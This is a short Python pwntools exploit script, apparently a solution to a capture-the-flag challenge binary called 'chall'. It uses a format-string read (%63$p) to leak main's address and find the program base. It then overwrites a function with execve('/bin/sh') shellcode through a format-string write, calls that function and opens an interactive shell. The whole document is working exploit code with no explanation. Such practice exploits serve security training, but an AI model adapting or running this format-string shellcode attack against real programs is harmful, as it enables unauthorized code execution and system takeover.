#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./chall')
local = True
GDBSCPT = '''
c
'''
OFFSET = 14
context.log_level="debug"
if local:
    conn = elf.process()
    #gdb.attach(conn, gdbscript=GDBSCPT)
else :
    host = HOST
    port = PORT
    conn = remote(host,port,ssl=True)

# get the address of main
conn.recv()
conn.sendline(b"1")
conn.sendline(b"%63$p ")
conn.recv()
conn.sendline(b"2")

MAIN = int(conn.recvline().strip().decode(),16)
log.info(f"main @ {hex(MAIN)}")

# update the base address 
elf.address = MAIN - elf.symbols["main"]

# get the address of func
FUNC = elf.symbols["func"]
log.info(f"func @ {hex(FUNC)}")

# generate a shellcode
shellcode = asm(shellcraft.execve("/bin/sh\0"))

# write the shellcode to the func address
payload = fmtstr_payload(OFFSET, {FUNC: shellcode},write_size="short")

# send payload
conn.sendline(b"1")
conn.recv()
conn.sendline(payload)
conn.recvuntil(b'Choice: ')
conn.sendline(b"2")
conn.recv()

# execute func (shellcode)
conn.sendline(b"3")

conn.interactive()
conn.close()
